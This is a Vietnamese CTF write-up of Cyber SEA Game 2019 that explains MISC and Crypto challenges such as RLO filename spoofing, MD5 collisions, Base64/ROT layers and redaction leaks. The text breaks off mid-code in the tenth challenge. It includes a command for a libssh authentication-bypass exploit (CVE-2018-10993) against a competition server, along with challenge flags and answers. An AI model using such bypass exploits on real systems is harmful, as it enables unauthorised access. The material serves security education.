# Cyber SEA Game 2019 — Lời giải CHI TIẾT (Tiếng Việt)

> Nguồn: https://github.com/end1an/Cyber-SEA-GAME-2019 (branch `master`). Writeup gốc do đội **Thái Lan**
> (vô địch 2019) công bố, chủ yếu dưới dạng ảnh chụp màn hình + README. Tài liệu này **viết lại, mở rộng và
> bổ sung kiến thức nền** để người mới cũng theo được, đồng thời **kiểm chứng lại mọi giá trị quan trọng**
> (flag, Base64, ROT, MD5, hash file). Mọi phân tích binary đều **tĩnh** — không chạy/execute file đề.

---

## 0. Tổng quan giải & cách đọc tài liệu

**Cyber SEA Game (CSG)** là giải CTF thường niên do Nhật Bản tài trợ (trong khuôn khổ hợp tác ASEAN–Japan),
dành cho tuyển thủ trẻ 10 nước Đông Nam Á: Thái Lan, Việt Nam, Indonesia, Singapore, Myanmar, Malaysia,
Campuchia, Philippines, Lào, Brunei. Thể thức **Jeopardy**: nhiều bài độc lập chia theo category, mỗi bài có
điểm theo độ khó; đội nhiều điểm nhất thắng. Đội vô địch nhận suất dự **SECCON** (chung kết CTF toàn cầu tại
Nhật). **Năm 2019 Thái Lan vô địch** và chính họ public bộ writeup này.

**Category trong repo:** `Binary` (khai thác/patch nhị phân), `OS` (reverse + Linux/OS internals),
`Web`, `Forensic`, `Network`, `MISC` (hỗn hợp), `Crypto`.

### Thuật ngữ nền tảng (đọc 1 lần, dùng cho cả tài liệu)

- **Flag:** chuỗi bí mật cần tìm, định dạng `flag{...}`. Nộp đúng = được điểm.
- **Base64:** cách *mã hóa* (không phải mã hóa bảo mật) nhị phân thành text dùng 64 ký tự
  `A-Za-z0-9+/`, đệm `=`. Nhận dạng: chuỗi dài, kết thúc `=` hoặc `==`, chỉ gồm ký tự trên. Giải bằng
  `base64 -d`, CyberChef, hay `base64.b64decode` trong Python.
- **ROT/Caesar:** dịch vòng bảng chữ cái n vị trí. ROT13 là trường hợp quen thuộc.
- **Hex (thập lục phân):** mỗi byte = 2 ký tự `0-9a-f`. "Unhex" = đổi hex về byte gốc.
- **MD5/SHA1/SHA256:** hàm băm một chiều. MD5 (128-bit) **đã vỡ về va chạm** (tạo được 2 file khác nhau cùng
  MD5) nhưng vẫn hay dùng làm "định danh file". SHA1 cũng đã có va chạm thực tế (SHAttered 2017).
- **Magic bytes / file signature:** vài byte đầu file xác định định dạng (ZIP=`50 4B 03 04` "PK..",
  PNG=`89 50 4E 47`, BMP=`42 4D` "BM", PDF=`25 50 44 46` "%PDF").
- **JWT (JSON Web Token):** token dạng `header.payload.signature`, mỗi phần Base64URL. `header` khai báo
  thuật toán ký (`alg`). Lỗ hổng kinh điển: `alg:none` (server chấp nhận token không chữ ký).
- **PE/ELF:** PE là định dạng file thực thi Windows (.exe); ELF là của Linux. "Not stripped" = còn ký hiệu
  hàm (dễ đọc hơn khi reverse).
- **IDA / dnSpy / Ghidra:** công cụ disassemble/decompile. dnSpy chuyên .NET (còn debug + sửa biến runtime).
- **UPX:** trình nén file thực thi phổ biến; `upx -d` giải nén lại.
- **Patch:** sửa trực tiếp byte trong file (ví dụ đổi lệnh nhảy `jz`↔`jnz`) để đổi luồng chạy.

### Quy ước mục trong mỗi bài

Mỗi challenge trình bày theo 8 mục: **(a) Đề bài & metadata** · **(b) Kiến thức nền** · **(c) Trinh sát**
· **(d) Phân tích & reasoning** · **(e) Lời giải/exploit** · **(f) Flag & ý nghĩa** · **(g) Cạm bẫy & cách
khác** · **(h) Tham khảo**.

---

## Bảng tổng hợp challenge (33 bài)

| # | Tên | Category | Điểm | Trạng thái repo | Flag |
|---|-----|----------|------|-----------------|------|
| 1 | RLO | MISC | 20 | Có lời giải | `flag{RLO_Disrupt_U}` |
| 2 | The Public Document F | MISC | 20 | Có lời giải (file đề mất) | `flag{dog_monkey_grandpa}` |
| 3 | notepad? | MISC | 30 | Có lời giải | `flag{DoNotTrustTheApparentExtension}` |
| 4 | ccTLD | MISC | 50 | Có lời giải | `flag{jp_bmllc2k=}` |
| 5 | Friend | MISC | 100 | Có lời giải | `flag{File0623_79054025255fb1a26e4bc422aef54eb4}` |
| 6 | well-known vulnerability 2 | MISC | 100 | Có lời giải (flag runtime) | *(CVE-2018-10993, không ghi flag)* |
| 7 | hidden msg | MISC | 150 | ⚠️ README rỗng | — |
| 8 | Trim Auth | MISC | 150 | ⚠️ README rỗng | — |
| 9 | The_Sword | Crypto | 50 | Có lời giải | `flag{PLUCK}` |
| 10 | Fraud(1) Whistle blowing | Crypto | 50 | Có lời giải | `flag{Th3_Emb3zzl3r_15_Fumie}` |
| 11 | ShellScript | Crypto | 200 | Có lời giải | `flag{Fileless_Malware_Often_Uses_ShellScript}` |
| 12 | Binary_Ultra-Introduction | Binary | 50 | ⚠️ README rỗng | — |
| 13 | sleepy | Binary | 100 | Có lời giải | `flag{s133p1ng_f0r3st}` |
| 14 | present | Binary | 100 | Có lời giải | `flag{TEST_EASY_IS_DEBUGGER_PRESENT!!}` |
| 15 | dotnet_branch | Binary | 120 | Có lời giải | `flag{dotN3T_pr0gr4m_de6ugg1ng_1s_e4sy}` |
| 16 | Unlock | Binary | 150 | Có lời giải | `flag{cf8236571e9dd3bcaf44b188bba4f15d}` |
| 17 | Which | OS | 60 | ⚠️ README rỗng | — |
| 18 | Record | OS | 70 | ⚠️ README rỗng | — |
| 19 | Shared | OS | 110 | Có lời giải | `flag{specify_the_library}` |
| 20 | Calc | OS | 180 | ⚠️ README rỗng | — |
| 21 | Fuzzy | Forensic | 50 | ⚠️ README rỗng | — |
| 22 | Melancholy Holiday(1) Broken Head | Forensic | 60 | ⚠️ Dở dang | *(chưa có flag)* |
| 23 | Starting | Forensic | 80 | ⚠️ README rỗng | — |
| 24 | Notes | Forensic | 120 | ⚠️ README rỗng | — |
| 25 | PDF-JPGS | Forensic | 120 | ⚠️ README rỗng | — |
| 26 | Intact | Network | 80 | ⚠️ README rỗng | — |
| 27 | WLAN | Network | 150 | Có lời giải | `flag{192.168.11.202}` |
| 28 | broken user management | Web | 150 | Có lời giải | `flag{SXMgdGhlIGNvcnJlY3QgYW5zd2VyISBDb25ncmF0cyE}` |
| 29 | broken router | Web | 150 | Có lời giải | `flag{94550b955569733446ebf2105ed54e9c22276d912befab7a4c}` |
| 30 | well-known vulnerability 1 | Web | 150 | Có lời giải (flag runtime) | *(Struts2/Tomcat RCE, không ghi flag)* |
| 31 | CAPTCHA Challenge | Web | 200 | Có script giải | *(flag runtime, không ghi)* |
| 32 | operand mistake | Web | 200 | ⚠️ README rỗng | — |
| 33 | WAF | Web | 250 | ⚠️ README rỗng | — |

**Thống kê flag thu được:** 16 flag đầy đủ trong repo; 3 bài nêu cách giải/CVE nhưng không ghi flag
(well-known 1, well-known 2, CAPTCHA); 1 bài dở dang (Melancholy Holiday); 13 bài README rỗng (repo không
kèm lời giải).

### Bảng hash file đề (đối chiếu toàn vẹn)

Các file đề **nhỏ** đã được tải về và băm THẬT bằng Python `hashlib` (chỉ đọc bytes, **không execute**).
File lớn (Unlock 1.8MB, WLAN 528KB, Fuzzy zip 1.2MB, Friend 287KB, Broken_Head 286KB, important.bmp 368KB,
RLO exe 192KB) không tải để tránh nghẽn mạng — ghi kèm **git blob SHA-1** (từ Git tree, dùng làm tham chiếu
toàn vẹn) và hash nhúng trong tên file (do BTC đặt).

| File | Size | md5 (tính thật) | sha1 (tính thật) | Ghi chú |
|------|------|-----------------|------------------|---------|
| `Shared .../Shared_04dca...zip` | 4588 | `04dca129c011213979aded2e7bef71d3` | `7b57fbc78f278303beff68a5134c723683963185` | ✅ md5 khớp tên file |
| `Intact .../Intact_8688...pcapng` | 12040 | `8688e1a1263c414450b12985e0d5620b` | `069549649cb3e41bcaba9a2c6f5a62cf4b6b2bb1` | ✅ md5 khớp tên file |
| `broken router/1.1.zip` | 667 | `dcc2024f732ae75f7960058f58e42295` | `2b0c7700262712864f86f3f39f4f3afb32e2fed6` | file mẫu firmware |
| `sleepy/sleep` | 8880 | `d85883e7aa9057a7be6f2d6baadeefd0` | `c608591d124355a57c7c0ba2c93f280b944a58b0` | ELF gốc |
| `sleepy/sleep-patched` | 8880 | `80f66c3645cf9725db7ab4a01de03072` | `1b6d6c681e994a291290b97df464fbb010806fa0` | bản đã patch delay=0 |
| `dotnet_branch_fee.exe` | 10752 | `fee201a96c8e30d09141f7493457f1b6` | `ba2672203e7263df6d7128067a4ce8ad41ae24a5` | .NET; tên file ghi "fee" |
| `present/present.zip` | 17375 | `1ad90fb03793391a6c1f05c2e8c246db` | `bd3d7f2d5c6cbd4bfcd45efb32503a3d76ba7e9f` | chứa present.exe (UPX) |
| `present/present-unpack.exe` | 42873 | `432a864ed1b5f0afe7567d0072511480` | `e4025e31ed45658cb08556656019891c3b17e00d` | đã gỡ UPX |
| `present/present-patched.exe` | 42873 | `b22705c0e277d66103bb9c661d427b7d` | `5e7dfcd4842250c4dbef63daeee05d11bf679892` | đã patch jz→jnz |
| `notepad .../notepad_2976...zip` | 23685 | `44b9e842fc87324c1f756c61835ee62a` | `d44488eebe3843a34206c6e7bb71746c8e13c6a7` | ⚠️ md5 KHÁC tên file |
| `Binary_Ultra .../...bdb5...zip` | 6908 | `0e22e8be56bb87af3be9a21c04ac4f59` | `a98d399efde34dea4aeb0f8521543762928a008a` | ⚠️ md5 KHÁC tên file |
| `Fuzzy .../Fuzzy_8648...exe` | 102391 | `2f43c14cad2db191775275104f06896d` | `983dd3783811591412e1665c55063d98ac29e0e1` | tên file là sha256 |

⚠️ **Đính chính quan trọng:** với **notepad?** và **Binary_Ultra-Introduction**, md5 thật của file trong repo
**KHÁC** với chuỗi hash nhúng trong tên file. Nghĩa là file trong repo đã bị **đóng gói/nén lại** so với bản
BTC phát (ví dụ tác giả writeup zip lại). Hash trong tên file chỉ nên xem là *nhãn định danh của BTC*, không
phải md5 của chính file đang có trong repo. Ngược lại, **Shared** và **Intact** có md5 **khớp** tên — đây là
bằng chứng các file đó còn **nguyên bản**.

---

## 1. RLO (MISC - 20)

**(a) Đề bài & metadata.** Tên bài: *RLO*. Category MISC, 20 điểm (bài khởi động). File đề:
`RLO (MISC - 20)/RLO_7904ba4cdb3b1cb4c6a9f767c9ef065c.exe` (191927 bytes; git blob sha1
`4adbe37f7a7ea6f4613a9fd32cc44d9812d4dc21`; md5 nhúng trong tên: `7904ba4cdb3b1cb4c6a9f767c9ef065c`).
Mô tả: chạy file trên Windows thì nó "nhả" ra một loạt file **0 byte** với tên gồm bảng chữ cái bị xáo trộn.

**(b) Kiến thức nền.** *RLO* = **Right-to-Left Override**, ký tự điều khiển Unicode **U+202E**. Nó ra lệnh cho
trình hiển thị: "từ đây trở đi, vẽ văn bản theo chiều phải→trái". Đây là thủ thuật lừa người dùng kinh điển:
file tên `photo_gnp.exe` chèn RLO trước `gnp.exe` sẽ *hiển thị* thành `photo_exe.png` — nạn nhân tưởng ảnh PNG
nhưng thực chất là .exe. Windows Explorer và `cmd` đều tôn trọng U+202E khi in tên file nên tên "nhìn thấy"
khác với byte thật trên đĩa. Họ hàng của nó: LRO (U+202D), PDF/PDI (U+202C)... gọi chung là *Unicode BiDi
control characters*.

**(c) Trinh sát.** Liệt kê thư mục kết quả bằng `dir /O:D` (sắp theo **thời gian tạo** — chi tiết then chốt mà
writeup nhấn mạnh). Có 19 file 0 byte, tên dạng:
```
ABCDEFGHIJKLMNOPQRSTUVWXYZabcde?_{}zyxwvutsrqponmlkjihgf   (10:00 PM)
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk?_{}zyxwvutsrqponml   (11:00 PM)
ABCDEFGHIJKLMNOPQRSTUVWXYZ?_{}zyxwvutsrqponmlkjihgfedcba   (12:00 AM)
...
```
Mỗi tên chứa cụm `?_` ở vị trí khác nhau (`?` là nơi ký tự ẩn/RLO làm hỏng hiển thị; để ý nửa sau
`...zyxwvutsrqp...` là bảng chữ cái **ngược**).

**(d) Phân tích & reasoning.** Giả sử "bảng gốc" là
`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_{}`. Ký tự RLO được chèn vào *giữa* bảng khiến phần sau
nó bị đảo. Cụm `?_` đánh dấu vị trí chèn. **Ký tự ngay trước `?_`** cho biết "con trỏ" dừng ở đâu → ký tự *kế
tiếp* nó trong bảng gốc là 1 ký tự của flag.
- Dòng 1 (10:00PM): `...abcde?_...` → sau `e` là `f` → ký tự #1 = **f**.
- Dòng 2 (11:00PM): `...hijk?_...` → sau `k` là `l` → #2 = **l**.
- Lặp theo đúng thứ tự thời gian → ghép thành flag.

Hướng sai đã loại: cố "sửa" tên bằng cách bỏ ký tự RLO rồi đọc thẳng — ra chuỗi vô nghĩa, vì mỗi file chỉ mã
hóa **một** ký tự qua *vị trí* cụm `?_`, không phải đọc liền.

**(e) Lời giải.** Không cần chạy file; chỉ cần danh sách tên (đã có trong writeup). Trích ký tự trước mỗi `?_`,
+1 trong bảng gốc, xếp theo giờ tạo:
```python
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_{}"
names = [ ... ]            # tên file theo thứ tự thời gian từ 'dir /O:D'
flag = ""
for n in names:
    i = n.index("?_")      # tìm cụm đánh dấu
    prev = n[i-1]          # ký tự ngay trước '?_'
    flag += alphabet[alphabet.index(prev)+1]   # ký tự kế tiếp trong bảng gốc
print(flag)                # -> RLO_Disrupt_U
```

**(f) Flag & ý nghĩa.** `flag{RLO_Disrupt_U}` — "RLO Disrupt U(nicode)": ký tự BiDi của Unicode "phá" thứ tự
hiển thị để lừa người dùng.

**(g) Cạm bẫy & cách khác.** (1) Phải sort theo **thời gian**, không theo tên — sort sai thì flag loạn. (2)
Trên Linux các ký tự này hiển thị khác Windows; nên xem **hex** tên file (`ls | xxd`, hoặc Python
`os.listdir()` rồi in `repr`) để thấy chính xác U+202E. (3) Không cần chạy exe — an toàn hơn.

**(h) Tham khảo.** Unicode TR9 (BiDi Algorithm); kỹ thuật "RLO filename spoofing" của malware; `man dir`.

## 2. The Public Document F (MISC - 20)

**(a) Đề bài & metadata.** MISC, 20đ. File đề là một **PDF** (`challenge.pdf`) — ⚠️ **thiếu trong repo**
(README ghi "The file was missing"). Flag hiển thị trong PDF nhưng bị **khối đen** che.

**(b) Kiến thức nền.** PDF là định dạng *nhiều lớp*: text, ảnh, vector, annotation, và **metadata** (XMP /
Document Info: Title, Author, Keywords...). "Bôi đen" (redaction) **sai cách** là lỗi rò rỉ kinh điển: người ta
chỉ *vẽ hình chữ nhật đen đè lên* mà không xóa dữ liệu bên dưới → text/ảnh gốc vẫn còn, copy hoặc trích xuất
là lộ. Công cụ: trình đọc PDF (copy text), "Save image as", `exiftool`/`pdfinfo` đọc metadata.

**(c) Trinh sát.** Mở PDF thấy 2 dòng flag bị che. Thử: (i) bôi đen & Ctrl+C vùng che; (ii) chuột phải xem có
phải ảnh; (iii) `exiftool challenge.pdf` xem metadata.

**(d) Phân tích & reasoning.** Flag chia **3 phần** ở 3 "lớp" khác nhau để thử đủ kỹ năng:
- **Phần 1** là **ảnh** đè lên khối đen → không copy text được, nhưng "Save image as" lưu ảnh lộ `flag{dog_...}`.
- **Phần 2** là **text thật** dưới khối đen (redaction giả) → bôi đen + copy ra `..._monkey_...`.
- **Phần 3** nằm trong **metadata** → `exiftool` lộ phần cuối `grandpa`.

**(e) Lời giải.**
```
# Phần 1: chuột phải vùng flag -> "Save image as" -> mở ảnh -> "dog"
# Phần 2: bôi đen dòng 2 -> Ctrl+C -> dán -> "monkey"
exiftool challenge.pdf      # Phần 3: trường metadata -> "grandpa"
```

**(f) Flag & ý nghĩa.** `flag{dog_monkey_grandpa}` — minh họa *redaction sai cách*: bí mật lộ qua 3 kênh (ảnh,
text ẩn, metadata).

**(g) Cạm bẫy & cách khác.** File đề mất nên không tự kiểm chứng metadata; tin theo writeup. Cách khác trích
mọi nội dung: `pdftotext`, `pdfimages -all`, `mutool extract`, `qpdf --qdf` để xem object thô.

**(h) Tham khảo.** US-CERT guidance "improper PDF redaction"; `man exiftool`, `man pdfimages`.

## 3. notepad? (MISC - 30)

**(a) Đề bài & metadata.** Tên *notepad?* (dấu `?` là một phần tên — "có thật là notepad?"). MISC, 30đ. File
đề: `notepad? (MISC - 30)/notepad_2976ac4a36456915d06ad80bac402917.zip` (23685 bytes; git blob sha1
`117909cfb990c014c7c8a60ff1383ac2d221e3ec`). ⚠️ md5 thật của zip = `44b9e842fc87324c1f756c61835ee62a` **khác**
hash trong tên (`2976ac4a...`) — xem phần Đính chính đầu tài liệu.

**(b) Kiến thức nền.** Windows ẩn đuôi file quen thuộc và hiển thị **icon** theo đuôi, nên dễ bị lừa bởi *đuôi
giả*: (1) double extension `abc.txt.exe`; (2) **RLO** (U+202E) lật đuôi; (3) gán icon notepad cho .exe/.scr;
(4) file thật là loại khác hẳn — xác định bằng **magic bytes** (lệnh `file`), không bằng đuôi.

**(c) Trinh sát.** Giải nén → ra file nhìn như Notepad/.txt. Chạy `file <tên>` xem bản chất; `xxd | head` xem
magic bytes; nếu tên có ký tự lạ thì in `repr` phát hiện U+202E.

**(d) Phân tích & reasoning.** Flag `DoNotTrustTheApparentExtension` ("đừng tin đuôi hiển thị") nói rõ: file
*trông như* txt/notepad nhưng magic bytes cho thấy loại khác (ví dụ PE `MZ`, ảnh, hoặc script). Giải bài = nhận
ra trò lừa và lấy flag bên trong file "thật".

**(e) Lời giải (tĩnh, không chạy).**
```
unzip notepad_*.zip
file *                                 # bản chất thật khác đuôi hiển thị
strings -n 6 <file> | grep -i flag     # tìm flag nếu ở dạng text
```
Writeup gốc chỉ đính `flag.png`; flag chính là thông điệp bài học.

**(f) Flag & ý nghĩa.** `flag{DoNotTrustTheApparentExtension}` — luôn kiểm tra magic bytes, đừng tin đuôi/icon.

**(g) Cạm bẫy & cách khác.** Nếu file thật là .exe, **không chạy** — chỉ `strings`/mở trong VM cách ly. Cách
khác: `TrID`, `binwalk`, hoặc trình quản lý file Linux (không bị RLO đánh lừa như Windows).

**(h) Tham khảo.** MITRE ATT&CK T1036.007 (Masquerading: Double File Extension); `man file`.

## 4. ccTLD (MISC - 50)

**(a) Đề bài & metadata.** Tên *ccTLD* (country-code Top-Level Domain). MISC, 50đ. Đề cho bảng `A | B`, yêu
cầu điền hàng `● | ■`. Flag format `flag{A_B}`, ví dụ `flag{au_c3lkbmV5}`. Dữ liệu nằm trong README, không có
file nhị phân.

**(b) Kiến thức nền.** **ccTLD** là mã tên miền 2 chữ theo quốc gia (`au`=Úc, `jp`=Nhật, `us`=Mỹ...). Bài chồng
2 lớp: **Base64** (ngoài) + **ROT/Caesar** (trong). Mấu chốt "trí tuệ": nhận ra *ngữ cảnh* — danh sách là **các
thành phố đăng cai Olympic**.

**(c) Trinh sát.** Base64-decode cột B:
```
au -> sydney      (đọc được ngay)
us -> ucnv-ncmg-ekva
gr -> exlirw
it -> zaxot ...
```
Chỉ `au=sydney` có nghĩa → còn một lớp ROT nữa.

**(d) Phân tích & reasoning.** Thử ROT trên các giá trị đã-base64: **mỗi hàng dùng bước ROT khác nhau**, tăng
đều theo năm Olympic:
```
au -> sydney                         (2000 Sydney 🇦🇺)
us -> salt-lake-city   // ROT-2      (2002 Salt Lake City 🇺🇸)
gr -> athens           // ROT-4      (2004 Athens 🇬🇷)
cn -> beijing          // ROT-8      (2008 Beijing 🇨🇳)
...
kr -> pyeongchang      // ROT-18     (2018 PyeongChang 🇰🇷)
● | ■                  // ROT-20     (2020 ??? 🇯🇵)
cn -> beijing          // ROT-22     (2022 Beijing)
fr -> paris            // ROT-24     (2024 Paris 🇫🇷)
us -> la               // ROT-28     (2028 Los Angeles)
```
Hàng thiếu đứng ở **2020 → Tokyo, Nhật → `jp`**. Để khớp "công thức", mã hóa ngược: `tokyo` → **ROT20** →
**Base64**.

**(e) Lời giải (đã kiểm chứng bằng Python).**
```python
def rot(s,n):
    return ''.join(chr((ord(c)-97+n)%26+97) if c.islower() else c for c in s)
import base64
x = rot("tokyo", 20)                        # -> 'niesi'
print(base64.b64encode(x.encode()).decode())# -> 'bmllc2k='
```
Kết quả chạy thật: `rot20("tokyo")="niesi"`, `base64("niesi")="bmllc2k="`. Hàng thiếu là `jp | bmllc2k=`.

**(f) Flag & ý nghĩa.** `flag{jp_bmllc2k=}` — `jp` + giá trị mã hóa của "tokyo" (chủ nhà Olympic 2020).

**(g) Cạm bẫy & cách khác.** (1) Bước ROT = (năm − 2000), không phải số thứ tự hàng. (2) `it->gcluhi` ở ROT-26
(=ROT0) chỉ để xác nhận quy luật. (3) CyberChef: "From Base64" → "ROT13 brute" rồi đọc.

**(h) Tham khảo.** Danh sách thành phố Olympic; CyberChef.

## 5. Friend (MISC - 100)

**(a) Đề bài & metadata.** MISC, 100đ. File đề:
`Friend (MISC - 100)/Friend_0ad3d2abf5ededb11275ce89417f314e.zip` (287347 bytes; git blob sha1
`dbb4d77c9654d7b93447ebec794f0d68d81b83bd`). Bên trong có `File` và `File001..File999`. Yêu cầu: tìm file
**cùng đặc điểm** với `File` và nêu **bằng chứng**. Flag format `flag{File<4 số>_<alnum thường>}`.

**(b) Kiến thức nền.** **MD5** là hàm băm 128-bit. 2 file khác nhau rất khó cùng MD5 về lý thuyết, nhưng MD5
**đã bị phá va chạm** từ 2004 (Wang & Yu). Cặp thông điệp 128-byte nổi tiếng của Wang có **cùng MD5 =
`79054025255fb1a26e4bc422aef54eb4`** nhưng nội dung khác nhau; giá trị này xuất hiện khắp các demo "MD5 is
broken". Bài này chính là trò đó.

**(c) Trinh sát.**
```
unzip Friend_*.zip
md5sum File File???? | sort | uniq -w32 -D      # gom các md5 trùng
```

**(d) Phân tích & reasoning.** `File` và `File0623` **cùng md5** `79054025255fb1a26e4bc422aef54eb4`. Kiểm
chứng (Python): giá trị này KHÔNG phải md5 chuỗi rỗng (`d41d8cd9...`) mà đúng là MD5 của **cặp va chạm Wang**.
Vậy "đặc điểm chung" = cùng MD5 dù nội dung khác → **MD5 collision**. So bằng sha256 sẽ thấy 2 file khác hẳn →
bằng chứng MD5 không an toàn.

**(e) Lời giải.**
```bash
unzip Friend_*.zip
target=$(md5sum File | awk '{print $1}')       # 79054025255fb1a26e4bc422aef54eb4
for f in File[0-9][0-9][0-9][0-9]; do
    [ "$(md5sum "$f" | awk '{print $1}')" = "$target" ] && echo "KHỚP: $f"
done                                            # -> KHỚP: File0623
cmp File File0623                               # khác nội dung
sha256sum File File0623                         # 2 sha256 khác => cùng MD5 nhưng file khác
```

**(f) Flag & ý nghĩa.** `flag{File0623_79054025255fb1a26e4bc422aef54eb4}` — tên file trùng + MD5 va chạm làm
bằng chứng. Thông điệp: **đừng dùng MD5 để kiểm tra toàn vẹn/chữ ký**.

**(g) Cạm bẫy & cách khác.** Dùng sha1/sha256 để tìm trùng sẽ **không** ra (chỉ MD5 va chạm). `fdupes` so byte
nội dung cũng báo khác — bài cố tình đánh vào điểm yếu *chỉ-MD5*.

**(h) Tham khảo.** Wang, Feng, Lai, Yu (2004) "Collisions for Hash Functions MD5..."; giá trị
`79054025255fb1a26e4bc422aef54eb4`.

## 6. well-known vulnerability 2 (MISC - 100)

**(a) Đề bài & metadata.** MISC, 100đ. Không file đề; chỉ `10.3.204.203:2222`. Gợi ý: "lỗ hổng nổi tiếng, có
exploit công khai".

**(b) Kiến thức nền.** **libssh** là thư viện SSH (khác OpenSSH). **CVE-2018-10993**: nếu **client** chủ động
gửi gói `SSH2_MSG_USERAUTH_SUCCESS` (vốn chỉ server gửi để báo đăng nhập OK), state machine của libssh server
bị nhầm và coi như đã xác thực → **vào thẳng** không cần mật khẩu/khóa. Ảnh hưởng libssh trước 0.7.6 / 0.8.4.

**(c) Trinh sát.** `nc 10.3.204.203 2222` → banner `SSH-2.0-libssh_0.8.1` (0.8.1 < 0.8.4 ⇒ dính CVE).

**(d) Phân tích & reasoning.** Tra banner → CVE-2018-10993. Chọn PoC gửi USERAUTH_SUCCESS sớm rồi mở channel
chạy lệnh.

**(e) Lời giải (theo writeup gốc).**
```
python exploitssh.py 10.3.204.203 -p 2222 -c "cat flag.txt"
```
PoC: bắt tay KEX → gửi USERAUTH_SUCCESS (bỏ qua auth) → mở `session` channel → `exec cat flag.txt`.

**(f) Flag & ý nghĩa.** ⚠️ **Writeup gốc không ghi flag** (xuất hiện khi chạy trên server live đã gỡ). Ý nghĩa:
cập nhật libssh; auth bypass cực nguy hiểm.

**(g) Cạm bẫy & cách khác.** Nhiều PoC khác nhau, phải đúng phiên bản. Nếu server là OpenSSH thì CVE này
**không** áp dụng — đọc kỹ banner.

**(h) Tham khảo.** CVE-2018-10993; advisory libssh "Authentication bypass in server code".

## 7. hidden msg (MISC - 150)

⚠️ **Repo không có lời giải sẵn.** `README.md` rỗng (0 byte), không có file đề. Từ tên bài, nhiều khả năng là
**steganography** (giấu tin trong ảnh/âm thanh/văn bản). Hướng xử lý tĩnh: `binwalk -e`, `zsteg` (PNG/BMP),
`steghide extract`, soi LSB, hoặc tìm zero-width characters / khoảng trắng bất thường trong text. Không đủ dữ
liệu để đưa flag.

## 8. Trim Auth (MISC - 150)

⚠️ **Repo không có lời giải sẵn.** `README.md` rỗng. Tên "Trim Auth" gợi ý lỗi **so khớp xác thực sau khi
trim/chuẩn hóa chuỗi**: token/username bị `trim()` khoảng trắng hoặc cắt độ dài làm 2 giá trị khác nhau hóa
"bằng nhau", hoặc loose comparison sau lọc. Không đủ dữ liệu để đưa flag.


---

## 9. The_Sword (Crypto - 50)

**(a) Đề bài & metadata.** Tên *The_Sword*. Crypto, 50đ. File: `The_Sword (Crypto - 50)/README.md` (chứa
đoạn Base64 lớn) + ảnh gợi ý `the_sword.png` (290134 bytes). Yêu cầu: "lấy flag từ đoạn text này".

**(b) Kiến thức nền.** Nhiều bài "crypto dễ" thực chất là **encoding + stego thị giác**, không phải mật mã
toán học. Ở đây: lớp **Base64**, sau đó là một kỹ thuật **ASCII-art/visual steganography** — chữ được "vẽ"
bằng cách phân bố một vài ký tự đặc biệt trong một khối số. Khi *tô sáng* (highlight) đúng tập ký tự, mắt
người nhìn ra chữ, còn máy thì không (đánh vào khả năng nhận dạng hình của con người).

**(c) Trinh sát.** Base64-decode đoạn trong README → một **khối số** dài nhiều dòng, chỉ gồm chữ số (chủ yếu
1-7 và lác đác 0, 8). Nhìn text thô không ra gì.

**(d) Phân tích & reasoning.** Khối số có đa số là 1..7, nhưng **0 và 8** xuất hiện thưa thớt và *tụ lại thành
cụm*. Đây là dấu hiệu stego hình: các chữ số 0/8 chính là "mực" vẽ nên hình. Khi highlight riêng ký tự `0`
và `8` trên nền các số khác, hình chữ **"PLUCK"** hiện ra (ảnh `the_sword.png` minh họa — "pluck the sword"
= rút kiếm, hợp chủ đề tên bài).

**(e) Lời giải.**
```python
import base64
blob = "MzU3MzM3..."                 # chuỗi Base64 trong README (rút gọn)
data = base64.b64decode(blob).decode()
# in khối số, nhưng thay mọi ký tự KHÔNG phải 0/8 bằng khoảng trắng để "vẽ" chữ:
for line in data.splitlines():
    print(''.join(c if c in '08' else ' ' for c in line))
# -> trên màn hình hiện hình chữ: P L U C K
```
Mẹo: nếu khối số là 1 dòng dài liền, phải cắt lại đúng độ rộng (ví dụ 80 cột như writeup) để các ký tự 0/8
xếp thành lưới → hình mới hiện đúng.

**(f) Flag & ý nghĩa.** `flag{PLUCK}` — chữ được "rút" (pluck) ra từ khối số, đúng ẩn ý tên bài "thanh kiếm".

**(g) Cạm bẫy & cách khác.** (1) Độ rộng dòng sai → hình méo, không đọc được. (2) Có thể render bằng cách đổ
số vào ảnh (mỗi ký tự 1 pixel, 0/8 = đen) rồi xem. (3) Đừng sa đà tìm "mật mã" — đây thuần stego thị giác.

**(h) Tham khảo.** Visual/ASCII-art steganography; CyberChef (From Base64).

## 10. Fraud(1) Whistle blowing (Crypto - 50)

**(a) Đề bài & metadata.** Tên *Fraud(1) Whistle blowing* ("tố giác tham nhũng"). Crypto, 50đ. File:
`Fraud(1) Whistle blowing (Crypto - 50)/README.md` + ảnh `unhex.png`. Đề: email vô danh chứa chuỗi
`/EF/BC/B6/EF/BC/A7/.../EF/BC/9D/EF/BC/9D`. Flag format `flag{[A-Za-z0-9 symbols]}`.

**(b) Kiến thức nền.** Chuỗi `/EF/BC/B6/...` là các **byte** biểu diễn hex, phân tách bằng `/`. Ba byte
`EF BC xx` / `EF BD xx` là **mã hóa UTF-8 của ký tự Unicode fullwidth** (dải U+FF00–U+FFEF). Ví dụ `Ｖ`
(U+FF36, "fullwidth V") = `EF BC B6`. "Fullwidth" là bản chữ cái/ký số rộng gấp đôi dùng trong văn bản CJK
(Trung/Nhật/Hàn). Chuẩn hóa **Unicode NFKC** sẽ đổi ký tự fullwidth về ASCII thường (`Ｖ`→`V`, `Ｑ`→`Q`, `＝`→`=`).

**(c) Trinh sát.** (1) **Unhex**: tách theo `/`, mỗi phần tử là 1 byte hex → ghép thành chuỗi bytes. Decode
UTF-8 → ra chuỗi fullwidth `ＶＧｇｚＸ０...＝＝` (ảnh `unhex.png` của writeup). Nhìn đã giống Base64 (có `＝＝` ở cuối).

**(d) Phân tích & reasoning.** Chuỗi fullwidth khi NFKC-normalize → Base64 ASCII:
`VGgzX0VtYjN6emwzcl8xNV9GdW1pZQ==`. Base64 decode → `Th3_Emb3zzl3r_15_Fumie` ("The Embezzler is Fumie" —
kẻ biển thủ là Fumie, hợp cốt truyện "tố giác tham nhũng").

**(e) Lời giải (đã kiểm chứng toàn bộ bằng Python).**
```python
import base64, unicodedata
hexpath = "/EF/BC/B6/EF/BC/A7/.../EF/BC/9D/EF/BC/9D"       # chuỗi trong đề
bs = bytes(int(x,16) for x in hexpath.split('/') if x)     # unhex -> bytes
